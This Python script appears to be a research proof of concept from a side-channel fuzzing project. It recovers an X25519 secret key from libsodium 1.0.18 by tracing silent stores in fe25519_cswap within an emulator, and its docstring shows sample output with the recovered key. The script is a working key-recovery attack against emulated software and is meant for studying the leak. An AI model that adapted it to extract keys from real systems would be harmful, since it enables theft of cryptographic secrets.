#!/usr/bin/env python3
"""
david.mateos@AF-519:~/pandora_fuzzing_dev/revizor$ time ./src/attack_x25519_ssi.py
Secret key: 7a 8c a5 cc 39 b5 19 ec c0 3b c8 19 2e 28 99 5e bc 14 7a 3e 1f 7a 8e b4 0c b8 26 12 51 e1 7f f8

Recovered key: 78 8c a5 cc 39 b5 19 ec c0 3b c8 19 2e 28 99 5e bc 14 7a 3e 1f 7a 8e b4 0c b8 26 12 51 e1 7f 78
Secret key:    7a 8c a5 cc 39 b5 19 ec c0 3b c8 19 2e 28 99 5e bc 14 7a 3e 1f 7a 8e b4 0c b8 26 12 51 e1 7f f8


real     0m5,153s
user     0m4,420s
sys	     0m0,269s
"""

import ctypes
import time
import random
import itertools
import subprocess
from attack_common import hexspaces, check_correct_file
from model import SilentStoreInitializedMemTracer, X86UnicornModel
from input_generator import X25519InputGenerator, Input
from interfaces import RawTrace

SECRET_KEY_LENGTH = X25519InputGenerator.SECRETKEYBYTES
PUBLIC_KEY_LENGTH = X25519InputGenerator.PUBLICKEYBYTES

class Service:
	"""
	This models a service that uses X25519 to calculate a shared secret key that
	could be later used to send messages to the attacker. It uses the service
	secret key and the attacker public key to compute the shared secret key. It
	assumes the attacker controls its public key and is able to observe silent
	stores and get a trace of the PCs where they happened, using trace(). His
	goal is to leak the service secret key.
	"""
	def __init__(self):
		self.secret_key = random.randbytes(SECRET_KEY_LENGTH)
		self.model = X86UnicornModel("targets/libsodium", "crypto_box_beforenm")
		self.input_gen = X25519InputGenerator(self.model.STACK, self.model.STACK_SIZE)
		self.model.tracer = SilentStoreInitializedMemTracer(None)

	def trace(self, public_key: bytes) -> RawTrace:
		trace, _ = self.model.trace_test_case(self.input_gen.create_input(public_key, self.secret_key))
		return trace.trace

def get_random_public_key():
	c = ctypes.CDLL("targets/libsodium.so")
	pk = ctypes.create_string_buffer(PUBLIC_KEY_LENGTH)
	sk = ctypes.create_string_buffer(SECRET_KEY_LENGTH)
	c.crypto_box_keypair(pk, sk)
	return bytes(pk)

def main():
	check_correct_file("targets/libsodium")
	service = Service()
	print(f"Secret key: {hexspaces(service.secret_key)}\n")

	public_key = get_random_public_key()

	# Get the trace
	LEAK_SWAP_SS = 0x41796a # store in fe25519_cswap, https://github.com/jedisct1/libsodium/blob/1.0.18-RELEASE/src/libsodium/include/sodium/private/ed25519_ref10_fe_51.h#L174
	SEPARATOR_SS = 0x417903 # push r13, at the beginning of fe25519_cswap, https://github.com/jedisct1/libsodium/blob/1.0.18-RELEASE/src/libsodium/include/sodium/private/ed25519_ref10_fe_51.h#L147
	trace = service.trace(public_key)
	pcs = [int(observation, 16) for observation in trace]
	pcs = [pc for pc in pcs if pc in [LEAK_SWAP_SS, SEPARATOR_SS]]

	# Analyze the trace and get the bits of the key
	key_bits = [0] # pos 255 is 0, and loop starts on pos 254
	while pcs:
		if pcs[0] == SEPARATOR_SS:
			# No SS, swap happened
			swap = 1
			pcs = pcs[1:]
		else:
			# SS, no swap happened
			assert pcs[0:3] == [LEAK_SWAP_SS, SEPARATOR_SS, LEAK_SWAP_SS]
			swap = 0
			pcs = pcs[3:]
		bit = key_bits[-1] ^ swap # swap = xor of current and prev bits
		key_bits.append(bit)
	key_bits = key_bits[:-1] # last call to cswap happens outside of the loop
	assert len(key_bits) == 256

	# Get the key from the key bits
	key_bits = "".join([str(bit) for bit in key_bits])
	key = int(key_bits, 2)
	key = key.to_bytes(SECRET_KEY_LENGTH, "little")

	print(f"Recovered key: {hexspaces(key)}")
	print(f"Secret key:    {hexspaces(service.secret_key)}\n")

if __name__ == "__main__":
	main()
